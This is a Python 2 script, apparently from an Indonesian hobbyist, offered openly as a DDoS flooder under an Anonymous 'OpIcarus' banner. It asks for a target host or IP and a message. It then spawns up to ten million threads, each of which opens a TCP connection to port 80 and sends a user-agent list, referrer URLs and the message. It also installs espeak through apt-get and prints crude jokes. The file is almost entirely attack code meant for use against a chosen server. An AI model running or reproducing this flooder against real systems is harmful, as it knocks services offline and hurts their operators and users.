import time
import socket
import os
import sys
import string
import random,urllib,threading

#boleh dikembangkan bagi yang tau
#jangan diotak-atik jika tidak tau nanti error
#by Mr.w0n63dan
#warteg lovers :v

os.system('clear')
print("\033[94m[+] \033[97minstalling the \033[91mpackage \033[97m, Please wait :")
os.system('apt-get install espeak')
os.system('clear')
  
sayang1 = ("            #Orang gila mah bebas \033[91myou waras ? :v\033[97m ")
sayang2 = ('''          #Im \033[92mgood\033[97m at reading \033[93mpeople
          \033[97mMy \033[91msecret\033[97m ? I look for the \033[96mworst\033[97m in them\033[97m''')
sayang3 = ("            #'\033[91mlove \033[97mis foreever' \033[97mbullshit\033[97m")
sayang4 = ("            #we live in a kingdom of \033[91mbullshit\033[97m")
sayang5 = ("            #LEAVE ME \033[91mHERE \033[97m!")
sayang6 = ("            #no system \033[91mis safe \033[97m!")
def perawan():
    arts = [sayang1, sayang2, sayang3,sayang4,sayang5,sayang6]
    return random.choice(arts)
    	
#my agent  
def gendeng():
	uagent = []
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return uagent
	
#my bot
def kentir():
	jav = []
	jav.append("http://validator.w3.org/check?uri=")
	jav.append("http://www.facebook.com/sharer/sharer.php?u=")
	jav.append("https://www.google.co.id/search?q=")
	jav.append("https://www.lazada.co.id/searchbox/?spm=")
	jav.append("https://id.m.wikipedia.org/w/index.php?search=")
	jav.append("https://m.youtube.com/results?search_query=")
	jav.append("https://search.yahoo.com/search?p=")
	jav.append("https://www.detik.com/mostpopular?utm_source=")
	jav.append("https://m.kaskus.co.id/search?q=")
	jav.append("market://details?id=")
	jav.append("http://www.ucshare.net/u4?channel=")
	return jav
	
os.system('clear')

print("""\033[1;31m  \033[92m
                                             ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE DDOS!   |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_Anonymous |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
This is Anonymous: OpIcarus has started!
      :::::::::    :::::::: ::::::::::: ::::    ::: :::::::::: ::::::::::: 
     :+:    :+:  :+:    :+:     :+:     :+:+:   :+: :+:            :+:      
    +:+    +:+  +:+    +:+     +:+     :+:+:+  +:+ +:+            +:+       
   +#++:++#+   +#+    +:+     +#+     +#+ +:+ +#+ +#++:++#       +#+        
  +#+    +#+  +#+    +#+     +#+     +#+  +#+#+# +#+            +#+         
 #+#    #+#  #+#    #+#     #+#     #+#   #+#+# #+#            #+#          
#########    ########      ###     ###    #### ##########     ###
                                                        By : Mr.w0n63d4n
""")
print(perawan())
print(" ")
bot = (gendeng(),kentir(),"\n")
host=raw_input( "\033[94m[?] \033[97mHOST/IP Target\033[0m :\033[93m " )
surat=raw_input( "\033[94m[?]\033[97m pesan mu? \033[0m:\033[93m  " )
#Mr.w0n63d4n
ip = socket.gethostbyname( host )
print ("\033[94m[+]\033[97m The \033[91mTarget\033[97m Ip : [\033[92m" + ip + "\033[97m]")
print(" ")
os.system('espeak  Start-The-Attack-to-'+host)
os.system('clear')
print ("\033[94m[+] \033[97mStart The \033[97mAttack\033[97m...")
print ("")
def tetew(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.2)
tetew('\033[96msuka janda apa perawan ? :v jangan suka nyabun kasian anak lu :v\033[0m')
time.sleep(2)
def janda():
	sugeng = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		sugeng.connect((host, 80))
		sugeng.sendto( str(bot), (ip, 80) )
		sugeng.send( surat )
		print ("\033[94m [+]\033[92mSending\033[97m | \033[93m" + surat)
	except socket.error,msg:
		print("\033[94m[!]\033[96m Error, server DOWN !")
	sugeng.close()
for i in range(1,10000000):
	galau = threading.Thread(target = janda)
	galau.daemon = True
	galau.start()
	print (" [!]\033[95mTotal Paket\033[0m | \033[92m"),i
print ("DONE !")
